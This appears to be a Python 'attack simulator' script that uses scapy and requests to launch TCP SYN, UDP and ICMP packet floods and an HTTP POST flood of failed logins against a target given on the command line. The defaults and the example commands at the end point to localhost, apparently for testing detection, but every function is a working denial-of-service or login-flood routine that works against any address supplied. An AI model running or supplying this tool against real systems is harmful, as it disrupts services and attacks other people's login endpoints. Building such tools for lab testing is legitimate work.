import argparse
import random
import requests
from scapy.all import IP, TCP, UDP, ICMP, Raw, send

# ------------------------
# TCP SYN Flood
# ------------------------
def syn_flood(target_ip, target_port=80, count=1000):
    print(f"Executing TCP SYN Flood Attack: {target_ip}:{target_port} x{count}")
    for _ in range(count):
        pkt = IP(dst=target_ip)/TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        send(pkt, verbose=0)
    print("TCP SYN Flood complete")

# ------------------------
# UDP Flood
# ------------------------
def udp_flood(target_ip, target_port=80, count=1000):
    print(f"Executing UDP Flood Attack: {target_ip}:{target_port} x{count}")
    for _ in range(count):
        pkt = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="X"*512)
        send(pkt, verbose=0)
    print("UDP Flood complete")

# ------------------------
# ICMP Flood
# ------------------------
def icmp_flood(target_ip, count=1000):
    print(f"Executing ICMP Flood Attack: {target_ip} x{count}")
    for _ in range(count):
        pkt = IP(dst=target_ip)/ICMP()
        send(pkt, verbose=0)
    print("ICMP Flood complete")

# ------------------------
# HTTP POST Flood (Brute-force login simulation)
# ------------------------
def http_flood(url, count=1000):
    print(f"Executing HTTP POST Flood Attack: {url} x{count}")
    for i in range(count):
        try:
            response = requests.post(url, data={"username": f"user{i}", "password": "wrong"})
            print(f"[{i}] Status: {response.status_code}")
        except Exception as e:
            print(f"[{i}] Error: {e}")
    print("HTTP POST Flood complete")

# ------------------------
# Main Entry Point
# ------------------------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Attack simulator launcher - attack_launcher.py")
    parser.add_argument("--type", required=True, choices=["syn", "udp", "icmp", "http"], help="Type of attack")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP or URL")
    parser.add_argument("--port", type=int, default=5000, help="Target port (TCP/UDP only)")
    parser.add_argument("--count", type=int, default=1000, help="Number of attack attempts")
    parser.add_argument("--url", default="http://127.0.0.1:5000", help="URL for HTTP attack")

    args = parser.parse_args()

    if args.type == "syn":
        syn_flood(args.target, args.port, args.count)
    elif args.type == "udp":
        udp_flood(args.target, args.port, args.count)
    elif args.type == "icmp":
        icmp_flood(args.target, args.count)
    elif args.type == "http":
        http_flood(args.url, args.count)

### TCP SYN Flood
# python attack_launcher.py --type syn --target 127.0.0.1 --port 5000 --count 1000

### UDP Flood
# python attack_launcher.py --type udp --target 127.0.0.1 --port 5000 --count 1000

### ICMP Flood
# python attack_launcher.py --type icmp --target 127.0.0.1 --count 1000

### HTTP POST
# python attack_launcher.py --type http --url http://127.0.0.1:5000 --count 1000
